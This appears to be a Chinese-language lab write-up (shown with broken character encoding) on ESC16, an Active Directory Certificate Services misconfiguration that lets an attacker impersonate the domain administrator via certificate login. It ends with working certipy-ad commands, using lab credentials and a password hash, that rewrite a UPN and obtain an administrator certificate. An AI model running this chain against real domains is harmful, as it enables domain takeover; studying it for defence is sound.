# ESC16

##  ä»‹ç»

ESC16=ADCS=CAçº§é”™è¯¯é…ç½®

CAé¢å‘çš„è¯ä¹¦é‡Œ"ç¼ºå°‘SIDå®‰å…¨æ‰©å±•",å¯¼è‡´åŸŸæ§åœ¨è¯ä¹¦ç™»å½•æ—¶å›é€€åˆ°å¼±èº«ä»½æ˜ å°„æ¨¡å¼(çœ‹UPN/DNS),ä»è€Œå¯èƒ½è¢«å†’å……æˆåˆ«çš„ç”¨æˆ·(administrator).

## èƒŒæ™¯:å¾®è½¯ä¸ºä»€ä¹ˆè¦"SIDæ‰©å±•"

åœ¨2022å¹´ä¹‹å‰,ADç”¨è¯ä¹¦ç™»å½•(PKINT/SmartCard)æ—¶,è¯ä¹¦->adç”¨æˆ·çš„æ˜ å°„æ–¹å¼æ˜¯

### çœ‹è¯ä¹¦é‡Œçš„

(1)UPN(administrator@domain)

(2)DNS Name

(3)Subject

è¿™äº›å­—æ®µæ˜¯"å£°æ˜å‹"çš„,è°ç”³è¯·è¯ä¹¦,å­—æ®µé‡Œå†™ä»€ä¹ˆ,CAå¾ˆå¤šæ—¶å€™ä¸å¼ºæ£€.

æ‰€ä»¥:å¯ä»¥ä¼ªé€ æˆ"æˆ‘å«administrator"

### å¾®è½¯çš„ä¿®å¤(2022.5)

å¾®è½¯å¼•å…¥äº†ä¸€ä¸ªæ–°çš„æœºåˆ¶:

SID Security Extension

â€‹	1)è¯ä¹¦é‡Œä¼šå¸¦ä¸€ä¸ªå­—æ®µ:

â€‹		(1)è¿™ä¸ªè¯ä¹¦æ˜¯ç»™:SID=S-1-5-21-xxxx-500çš„

â€‹	2)åŸŸæ§åªä¿¡è¿™ä¸ªSID,ä¸å†ä¿¡"ä½ è¯´ä½ æ˜¯è°"

è¿™å«:Strong Certificate Mapping

## ESC16çš„æœ¬è´¨é—®é¢˜

ESC16å¹¶ä¸æ˜¯"æ¨¡æ¿"çš„é—®é¢˜,è€Œæ˜¯

â€‹	CAå…¨å±€ç¦ç”¨äº†SID Security Extension

åœ¨CAæ³¨å†Œè¡¨æœ‰ä¸ªé…ç½®

â€‹	DisableExtensionList

å¦‚æœé‡Œé¢åŒ…å«:

â€‹	1.3.6.1.4.1.311.25.2

æ ‡è¯†:CAä¸ç»™ä»»ä½•è¯ä¹¦åŠ SIDæ‰©å±•

### ç»“æœæ˜¯ä»€ä¹ˆ?

(1)åŸŸæ§æ”¶åˆ°è¯ä¹¦

(2)å‘ç°æ²¡æœ‰SID

(3)å¦‚æœåŸŸæ§æ²¡æœ‰è¢«è®¾ç½®æˆ"å¼ºåˆ¶æ‹’ç»å¼±æ˜ å°„"

(4)å°±å›å›é€€è€é€»è¾‘:çœ‹UPN/DNS/Subject

è¿™å°±æ˜¯ESC16èƒ½å¤Ÿæˆç«‹çš„åŸå› 

## ESC16è·Ÿå‰é¢æ”¹"UPN"çš„å…³ç³»

ESC16æœ¬èº«ä¸ç›´æ¥ææƒ

å®ƒåªæ˜¯"æŠŠé—¨å¸æ‰"

çœŸæ­£çš„æ”»å‡»é“¾é€šå¸¸æ˜¯:

æ”»å‡»è€…èƒ½åšåˆ°ä¸¤ä»¶äº‹ä¹‹ä¸€

(1)èƒ½æ”¹æŸä¸ªè´¦å·çš„UPN

(2)èƒ½ç”³è¯·ä¸€ä¸ªå¯ç”¨è®¤è¯çš„è¯ä¹¦

## æ”»å‡»é“¾é€»è¾‘

(1)æ”»å‡»è€…æ§åˆ¶ä¸€ä¸ªæ™®é€šè´¦å·/æœåŠ¡è´¦å·

(2)æ”¹å®ƒçš„UPN=administrator

(3)ç”¨å®ƒç”³è¯·ä¸€ä¸ªClient Authenticationè¯ä¹¦

(4)å› ä¸ºåŸŸæ§CAæœ‰ESC16->è¯ä¹¦é‡Œæ²¡æœ‰SID

(5)åŸŸæ§éªŒè¯è¯ä¹¦æ—¶:

â€‹	å“¦?UPN=administrator

â€‹	å½“æˆadministratorç™»å½•

## åŸŸæ§ç­–ç•¥å¯¹ESC16çš„å½±å“

åŸŸæ§æœ‰ä¸ªæ³¨å†Œè¡¨:

```
StrongCertificateBindingEnforcement
```

| å€¼   | è¡Œä¸º                       |
| ---- | -------------------------- |
| 0    | å…è®¸å¼±æ˜ å°„ï¼ˆæœ€å±é™©ï¼‰       |
| 1    | å…¼å®¹æ¨¡å¼ï¼ˆå¸¸è§ï¼‰           |
| 2    | å¼ºåˆ¶è¦æ±‚ SIDï¼ˆESC16 å¤±æ•ˆï¼‰ |

ğŸ‘‰ æ‰€ä»¥ä½ ä¼šçœ‹åˆ°ï¼š

- **æœ‰ ESC16 ä½†æ‰“ä¸é€š**
- åŸå› å¾€å¾€æ˜¯ï¼š**åŸŸæ§å·²å¼ºåˆ¶ SID**

## åˆ©ç”¨æ–¹æ³•

```
certipy-ad account update -username "p.agila@fluffy.htb" -p "prometheusx-303" -user ca_svc -upn 'administrator' -target-ip '10.129.3.38'
certipy-ad req -ns '10.129.3.38' -dc-ip '10.129.3.38' -u 'ca_svc' -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -ca 'fluffy-DC01-CA' -template 'User'
certipy-ad account update -username "p.agila@fluffy.htb" -p "prometheusx-303" -user ca_svc -upn 'ca_svc' -target-ip '10.129.3.38' 
certipy-ad auth -ns 10.129.3.38 -dc-ip 10.129.3.38 -domain 'fluffy.htb' -pfx 'administrator.pfx' 
```

